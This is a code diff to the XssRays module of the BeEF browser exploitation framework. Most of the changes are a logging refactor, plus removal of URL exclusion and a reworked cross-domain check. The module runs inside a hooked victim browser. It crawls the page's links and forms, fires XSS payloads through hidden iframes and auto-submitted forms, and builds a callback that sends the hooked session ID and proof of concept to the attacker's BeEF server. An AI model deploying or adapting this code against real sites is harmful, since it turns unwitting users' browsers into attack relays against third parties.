@@ -34,10 +34,7 @@
  */
 beef.net.xssrays = {
 
-    debug:true,
-    sameOrigin: false,
-    excludeURLS: /^https?:[\/]{2}somesite\.com/,
-    errorTimeout:500,
+    debug:false,
     cleanUpTimeout:5000,
     completed:0,
     totalConnections:0,
@@ -70,27 +67,36 @@ beef.net.xssrays = {
     rays: [],
     stack: [],
 
+    // util function. Print string to the console only if the debug flag is on.
+     printDebug:function(log){
+      if(this.debug){
+        console.log(log);
+      }
+    },
+
     // main function, where all starts :-)
-    startScan:function(xssraysScanId, hookedBrowserSession, beefUrl, crossDomain, timeout) {
+    startScan:function(xssraysScanId, hookedBrowserSession, beefUrl, crossDomain, timeout, debug) {
 
         this.xssraysScanId = xssraysScanId;
         this.hookedBrowserSession = hookedBrowserSession;
         this.beefUrl = beefUrl;
         this.crossDomain = crossDomain;
         this.cleanUpTimeout = timeout;
+        this.debug = debug;
 
         this.scan();
-        console.log("[XssRays] Starting scan");
+        beef.net.xssrays.printDebug("[XssRays] Starting scan");
         this.runJobs();
     },
+
     isIE:function() {
         return '\v' === 'v';
     },
     complete:function() {
-        console.log("[XssRays] complete beef.net.xssrays.completed [" + beef.net.xssrays.completed
+        beef.net.xssrays.printDebug("[XssRays] complete beef.net.xssrays.completed [" + beef.net.xssrays.completed
             + "] - beef.net.xssrays.totalConnections [" + beef.net.xssrays.totalConnections + "]");
         if (beef.net.xssrays.completed == beef.net.xssrays.totalConnections) {
-            console.log("[XssRays] COMPLETE, notifying BeEF for scan id [" + beef.net.xssrays.xssraysScanId + "]");
+            beef.net.xssrays.printDebug("[XssRays] COMPLETE, notifying BeEF for scan id [" + beef.net.xssrays.xssraysScanId + "]");
             //TODO: understand why this is never called
             beef.net.send('/xssrays', beef.net.xssrays.xssraysScanId, "something");
         } else {
@@ -98,7 +104,7 @@ beef.net.xssrays = {
         }
     },
     getNextJob:function() {
-        console.log("[XssRays] getNextJob");
+        beef.net.xssrays.printDebug("[XssRays] getNextJob");
         var that = this;
         if (this.stack.length > 0) {
             var func = that.stack.shift();
@@ -121,24 +127,20 @@ beef.net.xssrays = {
         return this;
     },
     scanLinks: function() { //TODO: add depth crawling for links that are in the same domain
-        console.log("[XssRays] scanLinks, document.links.length [" + document.links.length + "]");
+        beef.net.xssrays.printDebug("[XssRays] scanLinks, document.links.length [" + document.links.length + "]");
         for (var i = 0; i < document.links.length; i++) {
             var url = document.links[i];
-            if (this.excludeURLS.test(url)) {
-                continue;
-            }
 
-            //TODO: check if the location has a port specified. if yes, add it (location.port) => example.com:8080
-            if ((url.hostname.toString() === location.hostname.toString() || this.sameOrigin == false) && (location.protocol === 'http:' || location.protocol === 'https:')) {
-                console.log("[XssRays] Starting scanning URL [" + url + "]\n url.href => " + url.href +
+            if ((url.hostname.toString() === location.hostname.toString() || this.crossDomain) && (location.protocol === 'http:' || location.protocol === 'https:')) {
+                beef.net.xssrays.printDebug("[XssRays] Starting scanning URL [" + url + "]\n url.href => " + url.href +
                     "\n url.pathname => " + url.pathname + "\n" +
                     "url.search => " + url.search + "\n");
                 this.xss({href:url.href, pathname:url.pathname, hostname:url.hostname, port: url.port, protocol: location.protocol,
                     search:url.search, type: 'url'});//scan each link & param
             } else {
                 if (this.debug) {
-                    console.log('URLS\nurl :' + url.hostname.toString());
-                    console.log('\nlocation :' + location.hostname.toString());
+                    beef.net.xssrays.printDebug('[XssRays] Scan is not Cross-domain.  URLS\nurl :' + url.hostname.toString());
+                    beef.net.xssrays.printDebug('\nlocation :' + location.hostname.toString());
                 }
             }
         }
@@ -173,20 +175,20 @@ beef.net.xssrays = {
                         }
 
                         if (this.vectors[i].url) {
-                            if(target.port == null || target.port == ""){
-                                console.log("starting XSS on GET params of [" + target.href + "], passing url [" + target.protocol + '//' + target.hostname + target.pathname + "]");
+                            if (target.port == null || target.port == "") {
+                                beef.net.xssrays.printDebug("starting XSS on GET params of [" + target.href + "], passing url [" + target.protocol + '//' + target.hostname + target.pathname + "]");
                                 this.temp_run(target.protocol + '//' + target.hostname + target.pathname, 'GET', this.vectors[i], params, true);//params
-                            }else{
-                                console.log("starting XSS on GET params of [" + target.href + "], passing url [" + target.protocol + '//' + target.hostname + ':' +target.port + target.pathname + "]");
+                            } else {
+                                beef.net.xssrays.printDebug("starting XSS on GET params of [" + target.href + "], passing url [" + target.protocol + '//' + target.hostname + ':' + target.port + target.pathname + "]");
                                 this.temp_run(target.protocol + '//' + target.hostname + ':' + target.port + target.pathname, 'GET', this.vectors[i], params, true);//params
                             }
                         }
                         if (this.vectors[i].path) {
-                            if(target.port == null || target.port == ""){
-                                console.log("starting XSS on URI PATH of [" + target.href + "], passing url [" + target.protocol + '//' + target.hostname + target.pathname + "]");
+                            if (target.port == null || target.port == "") {
+                                beef.net.xssrays.printDebug("starting XSS on URI PATH of [" + target.href + "], passing url [" + target.protocol + '//' + target.hostname + target.pathname + "]");
                                 this.temp_run(target.protocol + '//' + target.hostname + target.pathname, 'GET', this.vectors[i], null, true);//paths
-                            }else{
-                                console.log("starting XSS on URI PATH of [" + target.href + "], passing url [" + target.protocol + '//' + target.hostname + ':' +target.port + target.pathname + "]");
+                            } else {
+                                beef.net.xssrays.printDebug("starting XSS on URI PATH of [" + target.href + "], passing url [" + target.protocol + '//' + target.hostname + ':' + target.port + target.pathname + "]");
                                 this.temp_run(target.protocol + '//' + target.hostname + ':' + target.port + target.pathname, 'GET', this.vectors[i], null, true);//paths
                             }
                         }
@@ -202,9 +204,6 @@ beef.net.xssrays = {
                         'POST' :
                         'GET';
 
-                    if (this.excludeURLS.test(action)) {
-                        continue;
-                    }
                     var excludeList = [];
                     for (var j = 0; j < document.forms[i].elements.length; j++) {
                         params[document.forms[i].elements[j].name] = document.forms[i].elements[j].value || 1;
@@ -221,19 +220,26 @@ beef.net.xssrays = {
                         if (!this.vectors[k].form) {
                             continue;
                         }
+                        if (!this.sameDomain && (this.host(action).toString() != this.host(location.toString()))) {
+                            if (this.debug) {
+                                beef.net.xssrays.printDebug('[XssRays] Scan is not Cross-domain. FormPost\naction :' + this.host(action).toString());
+                                beef.net.xssrays.printDebug('location :' + this.host(location));
+                            }
+                            continue;
+                        }
 
                         if (this.vectors[k].form) {
                             if (method === 'GET') {
-                                console.log("starting XSS on FORM action params, GET method of [" + action + "], params [" + paramsstring + "]");
+                                beef.net.xssrays.printDebug("starting XSS on FORM action params, GET method of [" + action + "], params [" + paramsstring + "]");
                                 this.temp_run(action, method, this.vectors[k], params, true, excludeList);//params
                             }
                             else {
-                                console.log("starting XSS on FORM action params, POST method of [" + action + "], params [" + paramsstring + "]");
+                                beef.net.xssrays.printDebug("starting XSS on FORM action params, POST method of [" + action + "], params [" + paramsstring + "]");
                                 this.temp_run(action, method, this.vectors[k], params, false, excludeList);//params
                             }
                         }
                         if (this.vectors[k].path) {
-                            console.log("starting XSS on FORM action URI PATH of [" + action + "], ");
+                            beef.net.xssrays.printDebug("starting XSS on FORM action URI PATH of [" + action + "], ");
                             this.temp_run(action, 'GET', this.vectors[k], null, true, excludeList);//paths
                         }
                     }
@@ -268,7 +274,7 @@ beef.net.xssrays = {
         this.stack.push(function() {
 
             beef.net.xssrays.uniqueID++;
-            console.log('[XssRays] Processing vector [' + vector.name + "], URL [" + url + "]");
+            beef.net.xssrays.printDebug('[XssRays] Processing vector [' + vector.name + "], URL [" + url + "]");
             var poc = '';
             var pocurl = url;
             var exploit = '';
@@ -334,41 +340,41 @@ beef.net.xssrays = {
             if (method === 'GET') {
                 iframe.src = url;
                 document.body.appendChild(iframe);
-                console.log("[xssrays] Creating XSS iFrame with src [" + iframe.src + "], id[" + iframe.id + "], time [" + iframe.time + "]");
+                beef.net.xssrays.printDebug("[xssrays] Creating XSS iFrame with src [" + iframe.src + "], id[" + iframe.id + "], time [" + iframe.time + "]");
             } else if (method === 'POST') {
                 var form = '<form action="' + beef.net.xssrays.escape(action) + '" method="post" id="frm">';
                 poc = '';
                 pocurl = action + "?";
                 paramsPos = 0;
 
-                console.log("form action [" + action + "]");
+                beef.net.xssrays.printDebug("form action [" + action + "]");
                 for (var i in params) {
                     if (params.hasOwnProperty(i)) {
 
-                            //poc = vector.input.replace(/XSS/g, "BUG");
-                            poc = "something";
-                            pocurl += i + '=' + (urlencode ? encodeURIComponent(poc) : poc); // + '&';
+                        //poc = vector.input.replace(/XSS/g, "BUG");
+                        poc = "something";
+                        pocurl += i + '=' + (urlencode ? encodeURIComponent(poc) : poc); // + '&';
 
-                            beef.net.xssrays.rays[beef.net.xssrays.uniqueID].vector.poc = pocurl;
-                            beef.net.xssrays.rays[beef.net.xssrays.uniqueID].vector.method = method;
+                        beef.net.xssrays.rays[beef.net.xssrays.uniqueID].vector.poc = pocurl;
+                        beef.net.xssrays.rays[beef.net.xssrays.uniqueID].vector.method = method;
 
-                            beefCallback = "document.location.href='" + this.beefUrl + "?hbsess=" + this.hookedBrowserSession + "&raysscanid=" + this.xssraysScanId
-                                + "&poc=" + ray.vector.poc + "&name=" + ray.vector.name + "&method=" + ray.vector.method + "'";
+                        beefCallback = "document.location.href='" + this.beefUrl + "?hbsess=" + this.hookedBrowserSession + "&raysscanid=" + this.xssraysScanId
+                            + "&poc=" + ray.vector.poc + "&name=" + ray.vector.name + "&method=" + ray.vector.method + "'";
 
-                            exploit = beef.net.xssrays.escape(vector.input.replace(/XSS/g, beefCallback));
-                            form += '<textarea name="' + i + '">' + exploit + '<\/textarea>';
-                            console.log("form param[" + i + "] = " + params[i].toString());
+                        exploit = beef.net.xssrays.escape(vector.input.replace(/XSS/g, beefCallback));
+                        form += '<textarea name="' + i + '">' + exploit + '<\/textarea>';
+                        beef.net.xssrays.printDebug("form param[" + i + "] = " + params[i].toString());
 
 
-                            paramsPos++;
+                        paramsPos++;
                     }
                 }
                 form += '<\/form>';
                 document.body.appendChild(iframe);
-                console.log("[xssrays] Creating form [" + form + "]");
+                beef.net.xssrays.printDebug("[xssrays] Creating form [" + form + "]");
                 iframe.contentWindow.document.writeln(form);
                 iframe.contentWindow.document.writeln('<script>document.createElement("form").submit.apply(document.forms[0]);<\/script>');
-                console.log("[xssrays] submitting form");
+                beef.net.xssrays.printDebug("[xssrays] submitting form");
             }
 
         });
@@ -384,7 +390,7 @@ beef.net.xssrays = {
 //            }
 //            var self = this;
 //            beef.net.xssrays.uniqueID++;
-//            console.log('[XssRays] Processing vector [' + vector.name + "], URL [" + url + "]");
+//            beef.net.xssrays.printDebug('[XssRays] Processing vector [' + vector.name + "], URL [" + url + "]");
 //            var poc = url;
 //            var exploit = '';
 //
@@ -392,14 +398,14 @@ beef.net.xssrays = {
 //
 //            beef.net.xssrays.rays[beef.net.xssrays.uniqueID] = {vector:vector,url:url,params:params};
 //            if (params == null) {
-//                console.log("[XssRays] NULL params");
+//                beef.net.xssrays.printDebug("[XssRays] NULL params");
 //                var filename = beef.net.xssrays.fileName(url);
 //                exploit = vector.input.replace(/XSS/g, logger);
 //                url = url.replace(filename, filename + '/' + (urlencode ? encodeURIComponent(exploit) : exploit) + '/');
 //                exploit = vector.input.replace(/XSS/g, 'alert(1)');
 //                poc = poc.replace(filename, filename + '/' + (urlencode ? encodeURIComponent(exploit) : exploit) + '/');
 //            } else if (method === 'GET') {
-//                console.log("[XssRays] params [" + params.toString() + "]");
+//                beef.net.xssrays.printDebug("[XssRays] params [" + params.toString() + "]");
 //                url = beef.net.xssrays.fileName(url);
 //                poc = url;
 //                if (!/[?]/.test(url)) {
@@ -447,8 +453,8 @@ beef.net.xssrays = {
 //            iframe.name = location + '#xss';
 //            iframe.ieonload = iframe.onload = function() {
 //                //TODO: throws Permission denied errors,
-//                console.log("[XssRays] iframe onload: id [" + iframe.id + "] - name [" + iframe.name + "]");
-//                console.log("[XssRays] this.contentWindow.location => " + this.contentWindow.location);
+//                beef.net.xssrays.printDebug("[XssRays] iframe onload: id [" + iframe.id + "] - name [" + iframe.name + "]");
+//                beef.net.xssrays.printDebug("[XssRays] this.contentWindow.location => " + this.contentWindow.location);
 //                try {
 //                    if (this.contentWindow.location.hash.slice(1) == 'xss') {
 //                        this.logger(this.id);
@@ -459,7 +465,7 @@ beef.net.xssrays = {
 //                        }
 //                    }
 //                } catch(e) {
-//                    console.log("[XssRays] iframe onload: id [" + iframe.id + "] - EXCEPTION [" + e.toString() + "]");
+//                    beef.net.xssrays.printDebug("[XssRays] iframe onload: id [" + iframe.id + "] - EXCEPTION [" + e.toString() + "]");
 //                }
 //
 //                var that = this;
@@ -523,11 +529,11 @@ beef.net.xssrays = {
             for (var i = 0; i < document.getElementsByTagName('iframe').length; i++) {
                 var iframe = document.getElementsByTagName('iframe')[i];
                 numOfConnections++;
-                //console.log("runJobs parseInt(this.timestamp()) [" + parseInt(beef.net.xssrays.timestamp()) + "], parseInt(iframe.time) [" + parseInt(iframe.time) + "]");
+                //beef.net.xssrays.printDebug("runJobs parseInt(this.timestamp()) [" + parseInt(beef.net.xssrays.timestamp()) + "], parseInt(iframe.time) [" + parseInt(iframe.time) + "]");
                 if (parseInt(beef.net.xssrays.timestamp()) - parseInt(iframe.time) > 5) {
                     if (iframe) {
                         beef.net.xssrays.complete();
-                        console.log("runJobs cleaning up iframe [" + iframe.id + "]");
+                        beef.net.xssrays.printDebug("runJobs cleaning up iframe [" + iframe.id + "]");
                         document.body.removeChild(iframe);
 
                     }
